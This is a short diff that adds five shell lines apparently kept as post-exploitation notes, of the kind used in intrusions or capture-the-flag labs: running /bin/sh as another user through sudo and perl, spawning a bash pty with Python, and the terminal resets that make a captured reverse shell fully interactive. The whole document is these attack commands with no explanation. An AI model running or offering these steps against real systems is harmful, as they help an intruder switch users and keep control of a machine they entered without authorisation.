@@ -1,0 +1,5 @@
+sudo -u cybereer perl -e 'exec "/bin/sh";'
+python -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+stty raw -echo;fg 
+reset; sh 1>&0 2>&0 
